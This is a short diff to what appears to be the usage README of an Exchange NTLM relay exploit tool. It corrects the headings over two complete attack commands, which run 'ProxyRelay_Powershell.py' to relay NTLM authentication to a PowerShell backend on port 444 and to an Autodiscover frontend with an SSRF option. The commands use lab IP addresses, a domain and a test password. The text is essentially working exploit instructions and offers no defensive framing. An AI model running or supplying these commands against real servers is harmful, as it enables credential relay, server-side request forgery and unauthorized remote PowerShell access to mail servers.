@@ -46,13 +46,14 @@ Run localpowershell.ps1 on the windows attack host.
 
 
 
-**Relay ntlm to Autodiscover Frontend**
+
+**Relay ntlm to Powershell Backend**
 
 python3 ./ProxyRelay_Powershell.py -smb2support -t "https://192.168.152.131:444/powershell" -nl "192.168.152.157" -d "server.cd"  -ns "192.168.152.132" -u "test@server.cd" -p "P@ssword123"
 
 
 
-**Relay ntlm to Powershell Backend**
+**Relay ntlm to Autodiscover Frontend**
 
 python3 ./ProxyRelay_Powershell.py -smb2support -t "https://192.168.152.131" -nl "192.168.152.157" -d "server.cd"  -ns "192.168.152.132" -u "test@server.cd" -p "P@ssword123"  -ssrf
 
